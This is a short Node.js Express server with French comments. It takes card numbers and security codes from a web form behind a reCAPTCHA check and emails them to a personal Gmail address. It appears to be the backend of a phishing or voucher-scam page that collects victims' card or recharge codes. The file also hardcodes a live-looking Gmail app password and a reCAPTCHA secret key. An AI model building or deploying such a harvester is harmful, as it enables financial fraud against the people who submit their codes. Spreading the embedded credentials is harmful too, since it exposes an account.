const express = require('express');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');
const path = require('path');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Afficher index.html
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Formulaire POST
app.post('/envoyer-code', async (req, res) => {
  const { numeroCarte, codeSecurite, 'g-recaptcha-response': captcha } = req.body;

  if (!captcha) {
    return res.send('Captcha invalide. Veuillez réessayer.');
  }

  try {
    // Vérifier le captcha avec Google
    const secretKey = '6Lc1nR4rAAAAAFg6HDld1nnkEwRD3Ja8e43Oikuw';
    const response = await axios.post(`https://www.google.com/recaptcha/api/siteverify?secret=${secretKey}&response=${captcha}`);

    if (!response.data.success) {
      return res.send('Échec de la vérification du captcha.');
    }

    // Configurer l'envoi d'e-mail
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: 'wanarnaud@gmail.com',
        pass: 'gyauzfvkgauczwhj' // Assure-toi d'utiliser un mot de passe d'application sécurisé ici
      }
    });

    const mailOptions = {
      from: 'wanarnaud@gmail.com',
      to: 'wanarnaud@gmail.com',
      subject: 'Nouveau code de carte',
      text: `Code : ${numeroCarte} – Montant : ${codeSecurite}`
    };

    await transporter.sendMail(mailOptions);

    // Rediriger vers la page de confirmation
    res.sendFile(path.join(__dirname, 'public', 'confirmation.html'));

  } catch (error) {
    console.error(error);
    res.send('Une erreur est survenue.');
  }
});

app.listen(PORT, () => {
  console.log(`Serveur lancé sur http://localhost:${PORT}`);
});